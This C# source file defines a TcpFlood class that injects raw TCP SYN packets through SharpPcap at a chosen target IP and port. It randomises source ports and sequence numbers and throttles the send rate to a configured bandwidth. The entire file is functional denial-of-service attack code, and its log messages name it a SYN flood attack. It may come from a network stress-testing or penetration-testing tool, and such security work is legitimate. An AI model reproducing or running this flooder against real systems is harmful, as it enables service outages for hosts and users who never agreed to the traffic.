using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using NLog;
using PacketDotNet;
using PacketDotNet.Tcp;
using SharpPcap;
using SharpPcap.LibPcap;

namespace Dorothy.Models
{
    public class TcpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private readonly string _sourceIp;
        private readonly PhysicalAddress _sourceMac;
        private readonly string _targetIp;
        private readonly byte[] _targetMac;
        private readonly int _targetPort;
        private readonly long _bytesPerSecond;
        private readonly CancellationToken _cancellationToken;
        private LibPcapLiveDevice? _device;

        public TcpFlood(string sourceIp, byte[] sourceMac, string targetIp, byte[] targetMac, int targetPort, long bytesPerSecond, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp;
            _sourceMac = new PhysicalAddress(sourceMac);
            _targetIp = targetIp;
            _targetMac = targetMac;
            _targetPort = targetPort;
            _bytesPerSecond = bytesPerSecond;
            _cancellationToken = cancellationToken;
        }

        public async Task StartAsync()
        {
            Logger.Info("Starting TCP SYN Flood attack.");

            try
            {
                _device = CaptureDeviceList.Instance
                    .OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Addresses.Any(addr => addr.Addr.ipAddress != null && addr.Addr.ipAddress.ToString() == _sourceIp));

                if (_device == null)
                {
                    Logger.Error("No device found with the specified source IP.");
                    throw new Exception("No device found with the specified source IP.");
                }

                _device.Open(DeviceModes.Promiscuous, 1000);

                if (_device is not IInjectionDevice injectionDevice)
                {
                    Logger.Error($"Device {_device.Name} does not support packet injection.");
                    throw new Exception($"Device {_device.Name} does not support packet injection.");
                }

                var random = new Random();
                var ethernetPacket = new EthernetPacket(
                    _sourceMac,
                    new PhysicalAddress(_targetMac),
                    EthernetType.IPv4);

                var ipPacket = new IPv4Packet(
                    IPAddress.Parse(_sourceIp),
                    IPAddress.Parse(_targetIp))
                {
                    Protocol = ProtocolType.Tcp,
                    TimeToLive = 128
                };

                var tcpPacket = new TcpPacket(
                    (ushort)random.Next(1024, 65535),
                    (ushort)_targetPort)
                {
                    Flags = TcpFlags.Syn,
                    WindowSize = 8192,
                    SequenceNumber = (uint)random.Next(),
                    PayloadData = new byte[0]  // SYN packets don't have payload
                };

                ipPacket.PayloadPacket = tcpPacket;
                ethernetPacket.PayloadPacket = ipPacket;

                double packetSize = ethernetPacket.Bytes.Length;
                int packetsPerSecond = (int)Math.Ceiling(_bytesPerSecond / packetSize);
                int batchSize = 1000;
                double delayMicroseconds = (1_000_000.0 * batchSize) / packetsPerSecond;

                Logger.Info($"TCP SYN Flood: Sending {packetsPerSecond} packets per second ({_bytesPerSecond / 125_000} Mbps).");

                await Task.Run(() =>
                {
                    var stopwatch = new System.Diagnostics.Stopwatch();
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            stopwatch.Restart();
                            for (int i = 0; i < batchSize && !_cancellationToken.IsCancellationRequested; i++)
                            {
                                tcpPacket.SourcePort = (ushort)random.Next(1024, 65535);
                                tcpPacket.SequenceNumber = (uint)random.Next();
                                injectionDevice.SendPacket(ethernetPacket);
                            }

                            double elapsedMicroseconds = stopwatch.ElapsedTicks * 1_000_000.0 / System.Diagnostics.Stopwatch.Frequency;
                            if (elapsedMicroseconds < delayMicroseconds)
                            {
                                int remainingMicroseconds = (int)(delayMicroseconds - elapsedMicroseconds);
                                if (remainingMicroseconds > 1000)
                                {
                                    Thread.Sleep(remainingMicroseconds / 1000);
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error(ex, "Failed to send TCP packet.");
                        }
                    }
                    return Task.CompletedTask;
                }, _cancellationToken);
            }
            catch (TaskCanceledException)
            {
                Logger.Info("TCP SYN Flood attack was canceled.");
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "TCP SYN Flood attack failed.");
                throw;
            }
            finally
            {
                _device?.Close();
                Logger.Info("TCP SYN Flood attack stopped.");
            }
        }

        public void Dispose()
        {
            _device?.Dispose();
        }
    }
}
